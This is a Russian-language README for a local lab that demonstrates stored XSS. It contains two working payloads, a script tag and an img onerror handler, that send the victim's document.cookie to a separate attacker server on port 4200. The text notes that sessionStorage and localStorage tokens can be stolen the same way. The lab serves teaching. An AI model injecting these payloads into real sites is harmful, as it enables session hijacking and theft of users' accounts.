
1. Запускаем сервера сайта(порт 3000) и мошенника(4200)

`npm install`
`node 3000.js`
`node 4200.js`

2. Переходим на форму: `127.0.0.1:3000/register`
3. Злоумышленик вводит в форму зловредный скрипт, например

```javascript
 <script>alert('your cookies have been stolen'); let stealImg = document.createElement('img');stealImg.src = 'http://127.0.0.1:4200/steal?cookie=' + document.cookie;document.body.appendChild(stealImg);</script>
 <img id="stealImg" width='0px' height='0px'><img src='' onerror="stealImg.src='http://127.0.0.1:4200/steal?cookie=' + document.cookie;">
```

4. Жертва переходит на `localhost:3000/register` и дружелюбно заполняет данные
5. Жертву редиректят на тред комментариев к посту -- т.е. скрипт злоумышленника подгружается как комментарий

Что произошло?

С помощью XSS атаки через несуществующее изображение злоумышленик похитил куки у жертвы.
Стоит сказать, что дополнительно таким образом можно похитить данные sessionstorage/localstorage, в которых часто хранят различные токены
